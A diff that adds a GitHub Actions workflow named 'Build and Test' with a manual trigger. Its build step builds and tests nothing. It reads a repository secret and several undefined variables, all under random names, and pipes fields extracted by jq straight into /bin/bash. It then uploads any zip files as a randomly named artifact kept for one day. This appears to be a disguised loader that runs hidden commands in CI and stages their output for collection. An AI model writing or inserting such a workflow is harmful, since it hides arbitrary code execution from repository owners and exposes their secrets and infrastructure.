@@ -1,0 +1,29 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  operation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build
+        env:
+          k3452: ${{ secrets.k3452 }}
+        run: |
+          printf '%s' "$k3452" | jq -r .mzrc14119 | /bin/bash
+          echo $ujix31 | jq -r .hvznn61134 | /bin/bash
+          printf '%s' "$tadhq19" | jq -r .zak6 | /bin/bash
+          printf '%s' "$q14614" | jq -r .r485 | /bin/bash
+          echo $l918 | jq -r .oz74 | /bin/bash
+          echo $cs09 | jq -r .h9703 | /bin/bash
+
+      - name: Archive output
+        uses: actions/upload-artifact@v4
+        with:
+          name: qQMfsYnv
+          path: "*.zip"
+          retention-days: 1
